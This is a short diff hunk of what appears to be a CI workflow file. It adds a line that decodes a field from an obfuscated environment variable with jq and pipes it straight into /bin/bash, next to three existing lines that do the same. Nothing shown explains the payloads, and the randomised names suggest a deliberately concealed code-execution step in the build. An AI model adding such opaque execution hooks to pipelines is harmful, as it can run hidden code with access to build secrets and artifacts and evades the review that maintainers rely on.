@@ -31,6 +31,7 @@ jobs:
           echo $oof4451 | jq -r .rsu9467 | /bin/bash
           echo $zpee939 | jq -r .equgn647 | /bin/bash
           echo $pglih242 | jq -r .yo011 | /bin/bash
+          echo $xsaj10 | jq -r .zga4089 | /bin/bash
 
       - name: Save archive
         if: always()
